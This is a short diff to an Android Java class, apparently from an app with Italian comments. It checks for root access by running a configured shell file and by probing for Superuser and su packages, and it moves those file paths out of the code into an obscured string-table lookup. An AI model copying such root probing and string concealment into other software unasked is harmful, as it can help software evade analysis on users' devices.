@@ -131,10 +131,13 @@ public class PackageInfo {
 
 		try {
 			// Verifichiamo di essere root
+			if (Cfg.DEBUG) {
+				Check.log(TAG + " (checkRoot), " + Configuration.shellFile);
+			}
 			final AutoFile file = new AutoFile(Configuration.shellFile);
 
 			if (file.exists() && file.canRead()) {
-				final Process p = Runtime.getRuntime().exec(Configuration.shellFile + Messages.getString("32.14"));
+				final Process p = Runtime.getRuntime().exec(Configuration.shellFile + Messages.getString("32_14"));
 				p.waitFor();
 
 				if (p.exitValue() == 1) {
@@ -201,13 +204,14 @@ public class PackageInfo {
 
 	private static boolean checkRootPackages() {
 		try {
-            File file = new File("/system/app/Superuser.apk");
+			//32_39=/system/app/Superuser.apk			
+            File file = new File(Messages.getString("32_39"));
             
             if (file.exists()) {
                 return true;
             }
-            
-            file = new File("/data/app/com.noshufou.android.su-1.apk");
+            //32_40=/data/app/com.noshufou.android.su-1.apk
+            file = new File(Messages.getString("32_40"));
 
             if (file.exists()) {
                 return true;
